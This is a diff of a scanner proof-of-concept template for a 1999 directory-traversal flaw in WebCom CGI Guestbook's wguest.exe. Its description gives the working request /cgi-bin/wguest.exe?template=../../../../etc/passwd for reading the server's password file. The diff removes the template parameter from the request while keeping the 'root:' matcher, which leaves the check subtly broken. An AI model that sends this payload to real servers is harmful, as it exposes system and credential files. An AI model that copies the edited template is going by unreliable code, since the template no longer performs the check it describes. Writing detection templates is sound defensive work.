@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Webcom CGI Guestbook 的 wguest.exe 对 template 参数缺乏过滤，攻击者可构造恶意请求读取服务器任意文件（如 /etc/passwd），导致敏感信息泄露。"
+description = "WebCom datakommunikation Guestbook 0.1 的 CGI 程序 wguest.exe 和 rguest.exe 未对 template 参数进行过滤，远程攻击者可通过目录遍历读取服务器任意文件。发送 GET 请求至 /cgi-bin/wguest.exe?template=../../../../etc/passwd 即可验证。"
 id = "POC-AVE-1999-0128"
-name = "Webcom CGI Guestbook wguest.exe 任意文件读取漏洞"
+name = "WebCom CGI Guestbook 任意文件读取 PoC"
 severity = "medium"
 tags = ["ave-1999-0128"]
 vuln_id = [
@@ -18,12 +18,15 @@ method = "GET"
 path = "/{{BaseURL}}/cgi-bin/wguest.exe"
 protocol = "http"
 
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = ["root:"]
-
-[[poc.requests.params]]
-name = "template"
-value = "/etc/passwd"
